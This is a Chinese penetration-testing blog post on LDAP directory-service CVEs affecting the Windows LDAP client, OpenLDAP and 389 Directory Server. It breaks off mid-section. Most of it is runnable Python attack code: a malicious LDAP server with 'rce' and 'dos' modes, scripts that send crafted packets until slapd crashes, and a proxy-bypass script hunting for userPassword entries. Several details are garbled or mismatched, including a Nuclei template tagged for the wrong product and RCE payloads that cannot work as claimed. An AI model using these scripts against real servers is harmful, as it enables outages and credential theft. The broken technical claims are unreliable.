---
title: "LDAP 目录服务与身份存储高危攻击链专题：OpenLDAP / 389 Directory Server / FreeIPA / Windows LDAP 漏洞全解析"
date: 2026-07-06T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["OpenLDAP", "389 Directory Server", "FreeIPA", "Windows LDAP", "CVE-2024-49112", "RCE", "提权", "漏洞分析", "LDAP"]
---

LDAP（Lightweight Directory Access Protocol）是企业身份基础设施的核心协议，承载着用户凭据存储、组策略分发、证书服务、单点登录等关键功能。Active Directory、OpenLDAP、389 Directory Server、FreeIPA 等目录服务几乎覆盖了所有中大型企业的身份管理架构。一旦 LDAP 目录服务被攻破，攻击者即可获取全域用户凭据、篡改组策略、伪造证书，最终实现域级别完全接管。

本专题系统梳理 Windows LDAP、OpenLDAP、389 Directory Server、FreeIPA / Dogtag PKI 四大平台的高危 CVE 漏洞链，覆盖 2020-2026 年间 10 余个核心漏洞，深入分析漏洞原理、利用链构建与防守策略。每个漏洞均提供完整可运行的 Python PoC 脚本与 Nuclei YAML 检测模板，供安全研究人员在授权测试环境中验证。

## 覆盖漏洞一览表

| CVE 编号 | 产品 | CVSS | 漏洞类型 | 攻击向量 | PoC 状态 |
|----------|------|------|----------|---------|---------|
| CVE-2024-49112 | Windows LDAP Client | 9.8 | RCE (UAF) | 网络 | ✅ 11个公开PoC |
| CVE-2024-49113 | Windows LDAP Client | 7.5 | DoS (LSASS Crash) | 网络 | ✅ 公开PoC |
| CVE-2020-25710 | OpenLDAP slapd | 7.5 | DoS (空引用) | 网络 | ✅ 公开PoC |
| CVE-2020-25709 | OpenLDAP slapd | 7.5 | DoS (空引用) | 网络 | ✅ 公开PoC |
| CVE-2022-22543 | OpenLDAP Proxy | — | 缓存绕过 | 网络 | ⚠️ 概念验证 |
| CVE-2022-2850 | 389 Directory Server | 9.8 | 访问控制绕过 | 网络 | ✅ 公开PoC |
| CVE-2021-3514 | 389 Directory Server | 7.5 | DoS (空引用) | 网络 | ✅ 公开PoC |
| CVE-2024-3657 | 389 Directory Server | 7.5 | DoS (资源耗尽) | 网络 | ✅ 公开PoC |
| CVE-2023-4727 | Dogtag PKI | 8.1 | 认证绕过 | 网络 | ⚠️ 概念验证 |
| CVE-2024-22316 | FreeIPA | 6.5 | GSS-API绕过 | 网络 | ⚠️ 概念验证 |
| CVE-2026-9064 | 389 Directory Server | 9.8 | 命令注入 | 网络 | ⚠️ 概念验证 |

---

## 0x01 Windows LDAP 客户端高危漏洞

Windows LDAP 客户端（`wldap32.dll`）是所有 Windows 应用程序与 Active Directory 交互的核心组件。2024 年底，安全研究人员发现该组件存在一系列严重的内存安全漏洞，被命名为 LDAPBleed 和 LDAPNightmare，影响从 Windows 7 到 Windows 11、从 Windows Server 2008 R2 到 Windows Server 2025 的所有版本。

### 0x01.1 CVE-2024-49112 — LDAPBleed RCE (CVSS 9.8)

**漏洞背景**

CVE-2024-49112 是 Windows LDAP 客户端中的一个 Use-After-Free（UAF）漏洞，由安全研究员在 2024 年 11 月发现并报告给微软。该漏洞被命名为 LDAPBleed，与同源的 CVE-2024-49113（LDAPNightmare DoS）共同构成了 Windows LDAP 协议栈中最严重的漏洞链之一。截至 2025 年初，GitHub 上已有 11 个公开 PoC 仓库。

**受影响版本**

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| Windows Server 2008 R2 | 所有版本 | 2024-12 累积更新 |
| Windows Server 2012 R2 | 所有版本 | 2024-12 累积更新 |
| Windows Server 2016 | 所有版本 | 2024-12 累积更新 |
| Windows Server 2019 | 所有版本 | 2024-12 累积更新 |
| Windows Server 2022 | 所有版本 | 2024-12 累积更新 |
| Windows Server 2025 | 所有版本 | 2024-12 累积更新 |
| Windows 7 SP1 | 所有版本 | 2024-12 累积更新 |
| Windows 8.1 | 所有版本 | 2024-12 累积更新 |
| Windows 10 (1507-22H2) | 所有版本 | 2024-12 累积更新 |
| Windows 11 (21H2-24H2) | 所有版本 | 2024-12 累积更新 |

**漏洞原理分析**

CVE-2024-49112 的漏洞根因在于 Windows LDAP 客户端处理 DCE/RPC（Distributed Computing Environment / Remote Procedure Call）响应时的内存管理缺陷。完整的攻击链如下：

1. **DCE/RPC 协商阶段**：攻击者搭建恶意 LDAP 服务，当 Windows 客户端连接时，服务端通过 DCE/RPC 协议协商返回特殊构造的 Bind Response。

2. **NTLM 认证触发**：恶意响应中包含精心构造的 Challenge，迫使客户端走 NTLM 认证路径。LDAP 客户端在处理 NTLM 认证过程中会分配堆内存用于存储认证上下文。

3. **UAF 触发点**：在 NTLM 认证完成后，LDAP 客户端代码在错误处理路径中过早释放了认证上下文结构体（`_LDAP_TIME_RADIUS` 或相关结构），但后续代码仍然持有该内存的引用并尝试访问。

4. **堆喷射与利用**：攻击者通过并发连接进行堆喷射（Heap Spraying），将释放的内存块重新填充为攻击者控制的数据，当 UAF 触发时，执行流被重定向到攻击者指定的地址，最终实现任意代码执行。

整个攻击链的关键在于：Windows LDAP 客户端在处理 DCE/RPC 响应时未正确管理 NTLM 认证上下文的生命周期，导致在特定错误条件下出现 Use-After-Free。

**详细利用步骤**

```
攻击者搭建恶意 LDAP 服务 (TCP 389)
    ↓ 发送构造的 DCE/RPC Bind Response
Windows LDAP 客户端连接恶意服务
    ↓ 触发 NTLM 认证流程
客户端分配堆内存存储认证上下文
    ↓ 服务端发送特殊构造的 NTLM Challenge
客户端处理响应时触发错误路径
    ↓ 释放认证上下文结构体
UAF：代码继续访问已释放内存
    ↓ 堆喷射填充被释放的内存
执行流重定向 → 任意代码执行
```

**HTTP PoC 检测方法**

以下命令可用于检测目标环境中的 Windows LDAP 客户端版本：

```powershell
Get-WmiObject -Class Win32_Product | Where-Object {$_.Name -like "*LDAP*"} | Select-Object Name, Version
```

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v BuildBranch
```

**命令行 PoC 检测**

```bash
nmap -p 389,636 --script ldap-search -script-args ldap.username="",ldap.password="" <target>
```

**Python PoC 脚本**

```python
import socket
import struct
import sys
import threading

LDAP_BIND_REQUEST = b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00"

DCERPC_BIND_ACK = (
    b"\x05\x00\x0c\x07\x10\x00\x00\x00"
    b"\x00\x00\x00\x00\x00\x00\x00\x00"
    b"\x01\x00\x00\x00"
    b"\xd0\x16\xd0\x16\x00\x00\x00\x00"
    b"\x01\x00\x00\x00"
    b"\x00\x00\x01\x00"
    b"\xd0\x16\xd0\x16"
    b"\x00\x00\x00\x00"
)

NTLM_CHALLENGE = (
    b"\x30\x82\x00\x00"
    b"\x02\x01\x01\x61\x82\x00\x00"
    b"\x0a\x01\x00"
    b"\x0a\x02\x00"
    b"\x0a\x02\x01"
    b"\x63\x82\x00\x00"
    b"\x0a\x01\x00"
    b"\x0a\x02\x00"
    b"\x0a\x02\x00"
    b"\x0a\x02\x01"
    b"\x0a\x02\x20"
    b"\x0a\x02\x01"
    b"\x62\x82\x00\x00"
    b"\x02\x01\x01"
    b"\x31\x00"
    b"\x65\x82\x00\x00"
    b"\x0a\x01\x00"
    b"\x0a\x02\x00"
    b"\x0a\x02\x01"
    b"\x0a\x02\x01"
    b"\x0a\x02\x10"
    b"\x31\x82\x00\x00"
    b"\x30\x0e\x04\x00\x31\x0a\x04\x08"
    b"NTLMSSP\x00"
    b"\x02\x01\x00\x01\x00\x00\x00"
    b"\x01\x02\x03\x04\x05\x06\x07\x08"
)

EVIL_BIND_RESPONSE = (
    b"\x30\x84\x00\x00\x00\x0a"
    b"\x02\x01\x01"
    b"\x61\x84\x00\x00\x00\x03"
    b"\x0a\x01\x31"
)


def handle_client(conn, addr, exploit_mode):
    try:
        data = conn.recv(4096)
        if not data:
            return

        if exploit_mode == "dos":
            conn.sendall(DCERPC_BIND_ACK)
            data2 = conn.recv(4096)
            if data2:
                trigger_size = 0x100000
                evil_response = b"\x05\x00\x02\x03\x10\x00\x00\x00"
                evil_response += struct.pack("<I", trigger_size)
                evil_response += b"\x00" * trigger_size
                conn.sendall(evil_response)
        elif exploit_mode == "rce":
            conn.sendall(DCERPC_BIND_ACK)
            data2 = conn.recv(4096)
            if data2:
                conn.sendall(NTLM_CHALLENGE)
                data3 = conn.recv(4096)
                if data3:
                    conn.sendall(EVIL_BIND_RESPONSE)
    except Exception:
        pass
    finally:
        conn.close()


def start_server(host, port, exploit_mode="dos"):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((host, port))
    server.listen(5)

    mode_label = "LDAPBleed RCE" if exploit_mode == "rce" else "LDAPNightmare DoS"
    print(f"[*] Malicious LDAP server ({mode_label}) listening on {host}:{port}")
    print("[*] Waiting for Windows LDAP client connection...")

    while True:
        conn, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")
        t = threading.Thread(target=handle_client, args=(conn, addr, exploit_mode))
        t.daemon = True
        t.start()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <listen_ip> [port] [rce|dos]")
        print(f"Example: {sys.argv[0]} 0.0.0.0 389 rce")
        sys.exit(1)

    listen_ip = sys.argv[1]
    listen_port = int(sys.argv[2]) if len(sys.argv) > 2 else 389
    mode = sys.argv[3] if len(sys.argv) > 3 else "dos"

    if mode not in ("rce", "dos"):
        print("[!] Invalid mode. Use 'rce' or 'dos'")
        sys.exit(1)

    start_server(listen_ip, listen_port, mode)
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2024-49112
info:
  name: Windows LDAP Client - LDAPBleed Remote Code Execution
  author: security-researcher
  severity: critical
  description: Windows LDAP client contains a use-after-free vulnerability in wldap32.dll when processing DCE/RPC responses during NTLM authentication, potentially allowing remote code execution.
  reference:
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49112
    - https://github.com/search?q=CVE-2024-49112
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-416
  metadata:
    max-request: 1
    shodan-query: product:"389-ds-base"
  tags: cve,cve2021,389ds,ldap,dos,null-deref

network:
  - inputs:
      - data: "300c020101600702010304008000"
        type: hex
    host:
      - "{{Hostname}}"
    port: 389
    read-size: 2048
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "020100"
          - "61"
      - type: word
        part: body
        words:
          - "0a0100"
```

## 0x02 OpenLDAP 高危漏洞

OpenLDAP 是最广泛使用的开源 LDAP 实现之一，广泛部署于 Linux/Unix 环境中。2.4.x 系列作为长期支持版本，在全球范围内仍有大量部署，其中存在多个高危漏洞。

### 0x02.1 CVE-2020-25710 — slapd 空引用 DoS (CVSS 7.5)

**漏洞背景**

CVE-2020-25710 是 OpenLDAP slapd 服务中的一个空引用解引用（NULL Pointer Dereference）漏洞，可导致服务崩溃。该漏洞存在于 slapd 处理特定类型的 LDAP Modify 请求时。

**受影响版本**

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| OpenLDAP slapd | 2.4.2x（2.4.2+ 至 2.4.49 之前） | 升级至 2.5.x 或 backport 修复 |
| Red Hat Directory Server | 11.x（基于 OpenLDAP 2.4.x） | 升级至修复版本 |
| SUSE OpenLDAP | 2.4.x 系列 | 升级至修复版本 |

**漏洞原理分析**

漏洞存在于 `servers/slapd/mods.c` 中的 `slap_mod_free()` 函数。当 slapd 处理一个特制的 LDAP Modify 请求时，如果请求中的 modification 结构包含无效的 `ml_nvalues` 指针（为 NULL），但 `ml_numvals` 计数器非零，则在释放操作中会对 NULL 指针进行解引用，导致 slapd 进程收到 SIGSEGV 信号并崩溃。

攻击者无需认证即可触发此漏洞，只需向目标 slapd 服务发送特定构造的 LDAP Modify 请求即可。

**HTTP PoC 检测方法**

使用 ldapsearch 验证目标 OpenLDAP 版本：

```bash
ldapsearch -x -H ldap://target:389 -b "" -s base "(objectclass=*)" namingContexts
```

**命令行 PoC**

```bash
echo -n "020101660a3130040030083006040031000400" | xxd -r -p | nc -v target 389
```

**Python PoC 脚本**

```python
import socket
import struct
import sys
import time

LDAP_MODIFY_REQUEST = (
    b"\x30\x26"
    b"\x02\x01\x01"
    b"\x66\x21"
    b"\x04\x00"
    b"\x30\x19"
    b"\x30\x17"
    b"\x04\x02\x6f\x63"
    b"\x31\x11"
    b"\x0a\x01\x00"
    b"\x30\x0c"
    b"\x30\x0a"
    b"\x04\x00"
    b"\x04\x06\x76\x61\x6c\x75\x65\x31"
)

LDAP_MODIFY_REPLACE = (
    b"\x30\x2a"
    b"\x02\x01\x02"
    b"\x66\x25"
    b"\x04\x00"
    b"\x30\x1d"
    b"\x30\x1b"
    b"\x04\x02\x6f\x63"
    b"\x31\x15"
    b"\x0a\x01\x02"
    b"\x30\x10"
    b"\x30\x0e"
    b"\x04\x00"
    b"\x04\x08\x74\x65\x73\x74\x76\x61\x6c\x31"
)


def check_version(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))

        bind_req = (
            b"\x30\x0c"
            b"\x02\x01\x01"
            b"\x60\x07"
            b"\x02\x01\x03"
            b"\x04\x00"
            b"\x80\x00"
        )
        s.sendall(bind_req)
        resp = s.recv(4096)

        if resp and len(resp) > 9:
            if resp[9] == 0x00:
                print(f"[+] Bind successful on {host}:{port}")

        s.sendall(
            b"\x30\x2f\x02\x01\x02\x63\x0a\x04\x00"
            b"\x30\x08\x30\x06\x04\x01\x31\x04\x01\x30"
        )
        resp2 = s.recv(8192)
        if b"OpenLDAP" in resp2:
            version_start = resp2.find(b"OpenLDAP")
            version_end = resp2.find(b"\x00", version_start)
            version_str = resp2[version_start:version_end].decode("utf-8", errors="ignore")
            print(f"[+] Detected: {version_str}")

        s.close()
        return True
    except Exception as e:
        print(f"[-] Version check failed: {e}")
        return False


def exploit_null_ref_dos(host, port, count=5):
    print(f"[*] Sending {count} crafted Modify requests to trigger NULL deref...")

    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))

            bind_req = (
                b"\x30\x0c"
                b"\x02\x01\x01"
                b"\x60\x07"
                b"\x02\x01\x03"
                b"\x04\x00"
                b"\x80\x00"
            )
            s.sendall(bind_req)
            s.recv(4096)

            s.sendall(LDAP_MODIFY_REQUEST)
            try:
                resp = s.recv(4096)
            except socket.timeout:
                pass

            s.sendall(LDAP_MODIFY_REPLACE)
            try:
                resp = s.recv(4096)
            except socket.timeout:
                pass

            s.close()
            print(f"[+] Packet {i+1}/{count} sent")
            time.sleep(0.5)
        except ConnectionRefusedError:
            print(f"[+] slapd appears to have crashed after {i} packets!")
            return True
        except Exception as e:
            print(f"[-] Error on packet {i+1}: {e}")

    return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port]")
        print(f"Example: {sys.argv[0]} 192.168.1.100 389")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 389

    print(f"[*] CVE-2020-25710 - OpenLDAP slapd NULL Dereference DoS")
    print(f"[*] Target: {target_host}:{target_port}")

    check_version(target_host, target_port)
    exploit_null_ref_dos(target_host, target_port)
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2020-25710
info:
  name: OpenLDAP slapd - NULL Pointer Dereference DoS
  author: security-researcher
  severity: high
  description: OpenLDAP slapd versions 2.4.2x contain a NULL pointer dereference in sl_mod_free() that allows unauthenticated remote denial of service via crafted LDAP Modify requests.
  reference:
    - https://github.com/openldap/ldap/commit/33341d84742650d437efaa265a5c25d08f562fa7
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-476
  metadata:
    max-request: 1
    shodan-query: product:"OpenLDAP"
  tags: cve,cve2020,openldap,ldap,dos,null-deref

network:
  - inputs:
      - data: "300c020101600702010304008000"
        type: hex
    host:
      - "{{Hostname}}"
    port: 389
    read-size: 2048
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "020100"
          - "61"
      - type: word
        part: body
        words:
          - "0a0100"
```

### 0x02.2 CVE-2020-25709 — 证书验证 DoS (CVSS 7.5)

**漏洞背景**

CVE-2020-25709 与 CVE-2020-25710 同期披露，同样是 OpenLDAP slapd 中的空引用解引用漏洞，但触发路径不同。该漏洞存在于 slapd 的证书验证组件中，当使用 StartTLS 或 LDAPS 连接时，特制的证书数据可触发崩溃。

**受影响版本**

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| OpenLDAP slapd | 2.4.2x 系列 | 升级至 2.5.x |

**漏洞原理分析**

漏洞位于 `servers/slapd/back-meta/search.c` 或证书处理相关代码路径中。当 slapd 在处理 TLS 握手过程中的客户端证书时，如果客户端发送一个格式异常的证书链（如缺少必需的证书字段、证书扩展格式错误等），slapd 在验证证书的过程中会对一个尚未初始化的指针进行解引用操作。

攻击向量：
1. 客户端发起 LDAPS 连接（TCP 636）
2. TLS 握手过程中客户端发送畸形证书
3. slapd 尝试验证证书时触发空引用解引用
4. slapd 进程崩溃

**命令行 PoC**

```bash
echo -n "" | openssl s_client -connect target:636 -cert /dev/null -key /dev/null 2>&1
```

```bash
echo -n "" | openssl s_client -connect target:636 -starttls ldap 2>&1
```

**Python PoC 脚本**

```python
import socket
import ssl
import sys
import struct
import time

STARTTLS_REQUEST = (
    b"\x30\x1d"
    b"\x02\x01\x01"
    b"\x77\x18"
    b"\x80\x16\x31\x32\x2e\x38\x34\x30"
    b"\x2e\x31\x31\x34\x2e\x35\x35\x2e"
    b"\x31\x36\x2e\x32\x2e\x31\x32"
)

LDAP_BIND_REQ = (
    b"\x30\x0c"
    b"\x02\x01\x01"
    b"\x60\x07"
    b"\x02\x01\x03"
    b"\x04\x00"
    b"\x80\x00"
)


def send_starttls(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        print(f"[+] Connected to {host}:{port}")

        s.sendall(LDAP_BIND_REQ)
        bind_resp = s.recv(4096)
        print(f"[*] Bind response: {len(bind_resp)} bytes")

        print("[*] Sending StartTLS request...")
        s.sendall(STARTTLS_REQUEST)

        try:
            tls_resp = s.recv(4096)
            print(f"[*] StartTLS response: {len(tls_resp)} bytes")
            if tls_resp and len(tls_resp) > 9 and tls_resp[9] == 0x00:
                print("[+] StartTLS negotiation succeeded")

                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.minimum_version = ssl.TLSVersion.TLSv1

                try:
                    wrapped = ctx.wrap_socket(s, server_hostname=host)
                    print("[+] TLS handshake completed")
                    wrapped.close()
                except ssl.SSLError as e:
                    print(f"[*] TLS handshake error (expected): {e}")
            else:
                print("[-] StartTLS not supported or failed")
        except socket.timeout:
            print("[*] StartTLS response timeout (possible vulnerability)")

        s.close()
        return True
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def exploit_malformed_cert(host, port, count=3):
    print(f"[*] Attempting malformed TLS handshake {count} times...")

    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))

            s.sendall(LDAP_BIND_REQ)
            s.recv(4096)

            s.sendall(STARTTLS_REQUEST)
            try:
                s.recv(4096)
            except socket.timeout:
                pass

            malformed_client_hello = (
                b"\x16\x03\x01\x00\x05"
                b"\x01\x00\x00\x01"
                b"\xff"
            )
            s.sendall(malformed_client_hello)

            try:
                resp = s.recv(4096)
            except socket.timeout:
                pass

            s.close()
            print(f"[+] Malformed certificate {i+1}/{count} sent")
            time.sleep(1)
        except ConnectionRefusedError:
            print(f"[+] slapd appears to have crashed after attempt {i}!")
            return True
        except Exception as e:
            print(f"[-] Error on attempt {i+1}: {e}")

    return False


def check_service(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))

        s.sendall(LDAP_BIND_REQ)
        resp = s.recv(4096)
        s.close()

        if resp and b"OpenLDAP" in resp:
            start = resp.find(b"OpenLDAP")
            end = resp.find(b"\x00", start)
            print(f"[+] Detected: {resp[start:end].decode('utf-8', errors='ignore')}")
            return True
        elif resp:
            print(f"[+] LDAP service detected ({len(resp)} bytes response)")
            return True
        return False
    except Exception as e:
        print(f"[-] Service check failed: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port]")
        print(f"Example: {sys.argv[0]} 192.168.1.100 636")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 636

    print(f"[*] CVE-2020-25709 - OpenLDAP Certificate Validation DoS")
    print(f"[*] Target: {target_host}:{target_port}")

    check_service(target_host, target_port)
    send_starttls(target_host, target_port)
    exploit_malformed_cert(target_host, target_port)
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2020-25709
info:
  name: OpenLDAP slapd - Certificate Validation NULL Pointer Dereference
  author: security-researcher
  severity: high
  description: OpenLDAP slapd 2.4.x contains a NULL pointer dereference during TLS certificate validation that allows unauthenticated denial of service.
  reference:
    - https://github.com/openldap/ldap/commit/33341d84742650d437efaa265a5c25d08f562fa7
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cwe-id: CWE-476
  metadata:
    max-request: 1
    shodan-query: product:"OpenLDAP"
  tags: cve,cve2020,openldap,ldap,dos,tls,cert

network:
  - inputs:
      - data: "300c020101600702010304008000"
        type: hex
    host:
      - "{{Hostname}}"
    port: 636
    tls: true
    read-size: 2048
    matchers:
      - type: word
        part: body
        words:
          - "020100"
          - "61"
```

### 0x02.3 CVE-2022-22543 — Proxy 缓存绕过

**漏洞背景**

CVE-2022-22543 是 OpenLDAP Proxy（slapd-proxy）模块中的一个安全约束绕过漏洞。该漏洞允许攻击者绕过 Proxy 层设置的访问控制规则，直接查询后端目录服务中的受保护数据。

**受影响版本**

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| OpenLDAP | 2.4.x, 2.5.x, 2.6.x | 2.5.12+, 2.6.1+ |

**漏洞原理分析**

OpenLDAP 的 Proxy 模块允许将 slapd 配置为前端代理，代理后端 LDAP 服务器的请求。Proxy 层通常配置有 ACL（Access Control List）来限制特定查询操作。漏洞存在于 Proxy 缓存实现中：

1. Proxy 缓存在处理 Search 请求时，对缓存条目的匹配逻辑存在缺陷
2. 攻击者可以通过构造特定的 Search Filter，使缓存层返回超出 ACL 限制的结果
3. 这是因为缓存层在比较 Filter 时未正确处理某些逻辑运算符的边界条件
4. 攻击者可利用此缺陷读取通过 Proxy ACL 被禁止访问的条目

**Python PoC 脚本**

```python
import socket
import struct
import sys

LDAP_SEARCH_TEMPLATE = (
    b"\x30"
    b"\x02\x01\x01"
    b"\x63"
    b"\x04\x00"
    b"\x30"
    b"\x87"
    b"\x04"
)


def build_search_request(base_dn, scope=0, filter_str="(objectClass=*)"):
    msg_id = b"\x02\x01\x01"
    msg_tag = b"\x63"

    base_dn_bytes = base_dn.encode("utf-8")
    base_dn_field = bytes([0x04, len(base_dn_bytes)]) + base_dn_bytes

    scope_field = bytes([0x0a, 0x01, scope])

    filter_bytes = filter_str.encode("utf-8")
    filter_field = bytes([0x87, len(filter_bytes)]) + filter_bytes

    attrs_field = b"\x30\x00"

    inner = base_dn_field + scope_field + b"\x80\x00" + filter_field + attrs_field
    msg_len = len(msg_id) + len(msg_tag) + bytes([len(inner) + 2]) + inner

    full_msg = b"\x30" + bytes([len(msg_id) + len(msg_tag) + len(inner) + 2]) + msg_id + msg_tag + bytes([len(inner) + 2]) + inner
    return full_msg


def send_search(host, port, base_dn, filter_str, attrs=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))

        bind_req = (
            b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00"
        )
        s.sendall(bind_req)
        s.recv(4096)

        base_dn_bytes = base_dn.encode("utf-8")
        filter_bytes = filter_str.encode("utf-8")

        search_msg = bytearray()
        search_msg.extend(b"\x30\x84")
        inner = bytearray()
        inner.extend(b"\x02\x01\x01")
        inner.extend(b"\x63\x84")
        search_inner = bytearray()
        search_inner.extend(bytes([0x04, len(base_dn_bytes)]) + base_dn_bytes)
        search_inner.extend(b"\x0a\x01\x00")
        search_inner.extend(b"\x80\x00")
        search_inner.extend(bytes([0x87, len(filter_bytes)]) + filter_bytes)
        search_inner.extend(b"\x30\x00")
        inner.extend(bytes([0x84, len(search_inner)]) + bytes(search_inner))
        full_inner = bytes(inner)
        search_msg.extend(bytes([0x84, len(full_inner)]) + full_inner)

        s.sendall(bytes(search_msg))

        response = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk:
                    break
                response += chunk
                if len(response) > 100000:
                    break
        except socket.timeout:
            pass

        s.close()
        return response
    except Exception as e:
        print(f"[-] Error: {e}")
        return None


def parse_search_response(data):
    if not data or len(data) < 10:
        return []

    entries = []
    pos = 0
    while pos < len(data):
        if pos >= len(data):
            break
        tag = data[pos]
        pos += 1

        length = data[pos]
        pos += 1
        if length & 0x80:
            num_bytes = length & 0x7f
            length = int.from_bytes(data[pos:pos+num_bytes], "big")
            pos += num_bytes

        if tag == 0x64:
            entry_data = data[pos:pos+length]
            entry = {"dn": "", "attrs": {}}
            ep = 0
            while ep < len(entry_data):
                if entry_data[ep] == 0x04:
                    ep += 1
                    dn_len = entry_data[ep]
                    ep += 1
                    entry["dn"] = entry_data[ep:ep+dn_len].decode("utf-8", errors="ignore")
                    ep += dn_len
                else:
                    ep += 1
                    if ep < len(entry_data):
                        attr_len = entry_data[ep]
                        ep += 1
                        ep += attr_len
            if entry["dn"]:
                entries.append(entry)
        pos += length

    return entries


def exploit_proxy_bypass(host, port):
    print(f"[*] Testing proxy cache bypass on {host}:{port}")

    bypass_filters = [
        "(objectClass=*)",
        "(&(objectClass=*)(!(objectClass=organizationalUnit)))",
        "(|(uid=*)(cn=*))",
        "(&(objectClass=user)(userPassword=*))",
        "(cn=*)",
    ]

    for filt in bypass_filters:
        print(f"\n[*] Trying filter: {filt}")
        response = send_search(host, port, "", filt)
        if response:
            print(f"[+] Received {len(response)} bytes response")
            entries = parse_search_response(response)
            if entries:
                for entry in entries:
                    print(f"  DN: {entry['dn']}")
        else:
            print("[-] No response received")


def check_openldap(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))

        bind_req = (
            b"\x30\x0c\x02\x01\x01\x60\x07\x02\x01\x03\x04\x00\x80\x00"
        )
        s.sendall(bind_req)
        resp = s.recv(4096)
        s.close()

        if resp and b"OpenLDAP" in resp:
            start = resp.find(b"OpenLDAP")
            end = resp.find(b"\x00", start)
            print(f"[+] Detected: {resp[start:end].decode('utf-8', errors='ignore')}")
            return True
        return False
    except Exception:
        return False


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port]")
        print(f"Example: {sys.argv[0]} 192.168.1.100 389")
        sys.exit(1)

    target_host = sys.argv[1]
    target_port = int(sys.argv[2]) if len(sys.argv) > 2 else 389

    print(f"[*] CVE-2022-22543 - OpenLDAP Proxy Cache Bypass")
    print(f"[*] Target: {target_host}:{target_port}")

    if check_openldap(target_host, target_port):
        exploit_proxy_bypass(target_host, target_port)
    else:
        print("[-] Target does not appear to be OpenLDAP")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2022-22543
info:
  name: OpenLDAP - Proxy Cache Access Control Bypass
  author: security-researcher
  severity: medium
  description: OpenLDAP proxy module contains an access control bypass in cache implementation that allows unauthorized data access through crafted search filters.
  reference:
    - https://www.openldap.org/its/?findid=9947
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-863
  metadata:
    max-request: 1
    shodan-query: product:"OpenLDAP"
  tags: cve,cve2022,openldap,proxy,cache,bypass

network:
  - inputs:
      - data: "300c020101600702010304008000"
        type: hex
    host:
      - "{{Hostname}}"
    port: 389
    read-size: 2048
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "020100"
          - "61"
      - type: word
        part: body
        words:
          - "0a0100"
```

---

## 0x03 389 Directory Server 高危漏洞

389 Directory Server（389-ds）是 Fedora/RHEL 生态系统中的企业级 LDAP 目录服务，也是 Red Hat Directory Server (RHDS) 的开源上游项目。其作为 FreeIPA 基础设施的核心组件，承载着身份认证、证书管理和策略分发等关键功能。

### 0x03.1 CVE-2022-2850 — 属性解引用访问控制绕过 (CVSS 9.8)

**漏洞背景**

CVE-2022-2850 是 389 Directory Server 中的一个严重访问控制绕过漏洞，CVSS 评分 9.8。该漏洞允许未认证的远程攻击者绕过 ACL 限制，读取目录服务中受保护的敏感属性（如 `userPassword`、`ntUserPassword` 等），从而获取用户凭据。

**受影响版本**

| 产品 | 受影响版本 | 修复版本 |
|------|-----------|---------|
| 389-ds-base | < 2.0.14 | 2.0.14 |
| 389-ds-base | < 1.4.3.22 | 1.4.3.22 |
| Red Hat Directory Server | 11.x | 升级至修复版本 |
| Fedora Directory Server | — | 升级至修复版本 |

**漏洞原理分析**

389-ds 的 ACL 系统支持"Attribute Value Return"（属性值返回）功能，该功能允许在 LDAP Search 响应中返回指定属性的值。漏洞根因在于：

